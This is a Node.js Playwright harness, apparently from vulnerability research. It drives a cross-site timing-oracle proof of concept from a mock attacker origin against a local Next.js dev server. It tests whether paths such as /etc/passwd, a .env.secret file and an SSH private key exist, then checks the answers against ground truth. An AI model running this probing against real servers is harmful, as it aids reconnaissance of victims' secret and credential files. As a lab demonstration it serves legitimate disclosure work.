// Drives oracle.html in real headless Chromium from a genuinely cross-site
// origin (attacker.test) against a `next dev` server on victimdev.test.
const { chromium } = require('playwright-core');

const PATHS = [
  // exists
  '/etc/passwd',
  '/etc/hostname',
  '/home/user/nextlab/package.json',
  '/home/user/nextlab',
  '/home/user/nextlab/.env.secret',
  // does not exist
  '/etc/definitely-not-here-xyz',
  '/home/user/nextlab/nope-not-a-file',
  '/home/user/nextlab/.env.production',
  '/root/.ssh/id_ed25519',
];

(async () => {
  const browser = await chromium.launch({
    executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
    headless: true,
    args: ['--no-sandbox', '--host-resolver-rules=MAP * 127.0.0.1'],
  });
  const page = await browser.newPage();
  page.on('console', (m) => console.log('  [page]', m.text()));
  await page.goto('http://attacker.test:8899/oracle.html');
  const result = await page.evaluate((p) => window.runOracle(p), PATHS);

  console.log('\nCross-site oracle result (attacker.test reading nothing, only timing navigation):');
  console.log('  path'.padEnd(46) + 'attacker concludes');
  for (const [p, exists] of Object.entries(result)) {
    console.log('  ' + p.padEnd(46) + (exists ? 'EXISTS' : 'missing'));
  }

  // Ground truth from the same machine, for comparison.
  const fs = require('fs');
  console.log('\nGround truth (fs.existsSync on the victim host):');
  let correct = 0;
  for (const p of PATHS) {
    const real = fs.existsSync(p);
    const ok = real === result[p];
    if (ok) correct++;
    console.log('  ' + p.padEnd(46) + (real ? 'EXISTS' : 'missing') + '   ' + (ok ? 'MATCH' : '*** MISMATCH ***'));
  }
  console.log(`\n${correct}/${PATHS.length} paths correctly determined cross-site.`);
  await browser.close();
})();
